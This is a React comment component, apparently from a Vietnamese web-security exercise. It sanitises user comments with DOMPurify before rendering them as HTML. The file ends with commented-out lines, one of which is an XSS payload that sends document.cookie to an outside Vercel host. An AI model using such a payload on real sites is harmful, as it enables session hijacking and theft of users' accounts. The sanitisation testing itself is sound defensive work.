import React from 'react'
import userAvatar from '../assets/images/avatar.png'
import moment from 'moment'
import Button from './Button'
import { useSelector } from 'react-redux'
import DOMPurify from 'dompurify'
const Comment = (props) => {
    const { userId, username, createdAt, avatar, comment, commentId,handleDeleteComment } = props
    const clearData = DOMPurify.sanitize(comment)
    const user = useSelector((state) => state.user?.user)
    return (
        <div className='flex gap-4'>
            <div className=' flex-none'>
                <img src={avatar ? avatar : userAvatar} alt="" className='w-[25px] h-[25px] object-cover rounded-full' />
            </div>
            <div className='flex flex-col flex-auto text-[15px]'>
                <div className='flex justify-between items-center'>
                    <h3 className='font-semibold'>
                        {username}
                    </h3>
                    <span className='text-xs italic'>
                        {moment(createdAt)?.fromNow()}
                    </span>
                </div>
                <div className='flex justify-between items-center px-4 text-sm mt-4 border border-gray-300 py-2 bg-gray-100'>
                    <span>
                        <span className='font-semibold'>Đã đánh giá:</span>
                        <span className='flex items-center gap-1'>
                             <div dangerouslySetInnerHTML={{"__html": DOMPurify.sanitize(comment,{FORBID_TAGS:['a','img'],FORBID_ATTR:['class']})}}></div>
                        </span>
                    </span>
                    <div>
                        {user?.id === userId &&
                            <Button
                                name='Xóa'
                                handleOnClick={() => handleDeleteComment(commentId)}
                            />
                        }
                    </div>
                </div>
            </div>
        </div>
    )
}

export default Comment
{/* <div dangerouslySetInnerHTML={{"__html": DOMPurify.sanitize(comment)}}></div> */}
{/* <b onclick={window.location="https://security-fe.vercel.app?cookie="+document.cookie}>click vo</b> */}
                            {/* {comment}   */}
                            {/* {clearData} */}
                           